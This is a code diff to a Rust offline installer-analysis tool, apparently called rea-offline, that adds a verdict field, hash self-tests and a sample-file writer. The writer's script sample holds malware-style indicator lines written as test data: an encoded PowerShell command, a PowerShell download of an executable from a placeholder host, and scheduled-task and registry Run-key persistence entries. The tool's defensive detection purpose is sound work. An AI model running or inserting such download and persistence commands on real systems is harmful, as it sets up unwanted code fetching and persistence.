@@ -12,7 +12,6 @@ use std::path::{Path, PathBuf};
 
 pub struct ScanOptions {
     pub target: PathBuf,
-    pub output: Option<PathBuf>,
     pub rea_path: Option<PathBuf>,
 }
 
@@ -20,20 +19,18 @@ pub struct ScanOptions {
 pub fn mode_scan(opts: ScanOptions) -> Result<Value> {
     let bridge = ReaBridge::new(ReaConfig { rea_path: opts.rea_path, timeout: None });
     let report = bridge.analyze(&opts.target)?;
-    let json = Value::obj(vec![
-        ("schema_version", Value::num(2)),
+    Ok(Value::obj(vec![
+        ("schema_version", Value::num(crate::SCHEMA_VERSION)),
         ("mode", Value::str("local-scan")),
         ("generated_unix", Value::num(unix_secs())),
+        ("verdict", Value::str(report.verdict())),
         ("report", report.to_json()),
-    ]);
-    emit(&json, &opts.output)?;
-    Ok(json)
+    ]))
 }
 
 pub struct SandboxOptions {
     pub installer: PathBuf,
     pub installer_args: Vec<String>,
-    pub output: Option<PathBuf>,
     pub rea_path: Option<PathBuf>,
     pub sandbox: SandboxConfig,
 }
@@ -81,7 +78,6 @@ pub fn mode_sandbox(opts: SandboxOptions) -> Result<Value> {
             map.insert("sandbox_path".into(), Value::str(sandbox.root.display().to_string()));
         }
     }
-    emit(&report, &opts.output)?;
     Ok(report)
 }
 
@@ -115,9 +111,10 @@ fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Pat
     let rea_report = bridge.analyze(install_dir)?;
     let installer_report = bridge.analyze(&opts.installer).ok();
     Ok(Value::obj(vec![
-        ("schema_version", Value::num(2)),
+        ("schema_version", Value::num(crate::SCHEMA_VERSION)),
         ("mode", Value::str("sandbox-installer")),
         ("generated_unix", Value::num(unix_secs())),
+        ("verdict", Value::str(rea_report.verdict())),
         ("installer", Value::str(opts.installer.display().to_string())),
         ("execution", Value::obj(vec![
             ("command", Value::str(outcome.command.clone())),
@@ -151,10 +148,19 @@ pub fn mode_doctor(rea_path: Option<PathBuf>) -> Result<Value> {
         std::fs::write(dir.join("doctor.txt"), b"ok")?;
         Ok(CleanupController::purge_dir(&dir, false)?.verified_zero_residue)
     })();
+    // Prove the hash primitives work on *this* build, not just in CI: a
+    // mangled toolchain or a bad cross-compile must be caught before an
+    // operator trusts a hash in a report.
+    let sha_ok = crate::sha256::hash_bytes(b"abc") == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
+    let md5_ok = crate::md5::hash_bytes(b"abc") == "900150983cd24fb0d6963f7d28e17f72";
     Ok(Value::obj(vec![
-        ("schema_version", Value::num(2)),
+        ("schema_version", Value::num(3)),
         ("mode", Value::str("doctor")),
         ("version", Value::str(env!("CARGO_PKG_VERSION"))),
+        ("hashes", Value::obj(vec![
+            ("sha256_selftest", Value::Bool(sha_ok)),
+            ("md5_selftest", Value::Bool(md5_ok)),
+        ])),
         ("os", Value::str(std::env::consts::OS)),
         ("arch", Value::str(std::env::consts::ARCH)),
         ("windows_job_objects", Value::Bool(cfg!(windows))),
@@ -172,10 +178,8 @@ pub fn mode_doctor(rea_path: Option<PathBuf>) -> Result<Value> {
     ]))
 }
 
-pub fn mode_snapshot(dir: &Path, output: &Option<PathBuf>) -> Result<Value> {
-    let snap = Snapshot::capture(dir)?;
-    if let Some(out) = output { snap.save(out)?; }
-    Ok(snap.to_json())
+pub fn mode_snapshot(dir: &Path) -> Result<Value> {
+    Ok(Snapshot::capture(dir)?.to_json())
 }
 
 pub fn mode_diff(before_path: &Path, after_path: &Path) -> Result<Value> {
@@ -194,14 +198,38 @@ pub fn mode_purge(path: &Path, force: bool) -> Result<Value> {
     ]))
 }
 
-fn emit(json: &Value, output: &Option<PathBuf>) -> Result<()> {
-    let text = json.to_string_pretty();
-    match output {
-        Some(path) => {
-            std::fs::write(path, format!("{text}\n"))?;
-            eprintln!("[rea-offline] report written to {}", path.display());
+/// Write a sample file for trying the tool / the CI smoke run.
+///
+/// `pe`    — a small, structurally valid PE32+ ("demo installer") whose
+///           import table and embedded strings give the analyzer and the
+///           rule engine something real to chew on. It is benign: nothing
+///           is executed, and the payload is plain text.
+/// `script` — a text file with the same capability strings, to exercise the
+///           non-PE path (entropy, indicators, rules) without any binary.
+pub fn write_sample(path: &Path, kind: &str) -> Result<PathBuf> {
+    let bytes = match kind.to_ascii_lowercase().as_str() {
+        "pe" | "exe" | "binary" => crate::testutil::demo_installer_bytes(),
+        "script" | "text" => {
+            let mut text = String::new();
+            text.push_str("@echo off\nrem rea-offline demo: benign sample, not a real installer\n");
+            text.push_str("powershell -enc ZQBjAGgAbwAgAGgAaQA=\n");
+            text.push_str("powershell -Command \"Invoke-WebRequest https://example.invalid/update.exe\"\n");
+            text.push_str("schtasks /create /tn Demo /tr demo.exe /sc onlogon\n");
+            text.push_str("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Demo /d demo.exe\n");
+            text
+                .into_bytes()
         }
-        None => println!("{text}"),
+        other => {
+            return Err(Error::InvalidInput(format!(
+                "--kind must be pe or script (got '{other}')"
+            )))
+        }
+    };
+    if let Some(parent) = path.parent() {
+        if !parent.as_os_str().is_empty() {
+            std::fs::create_dir_all(parent)?;
+        }
     }
-    Ok(())
+    std::fs::write(path, &bytes)?;
+    Ok(path.to_path_buf())
 }
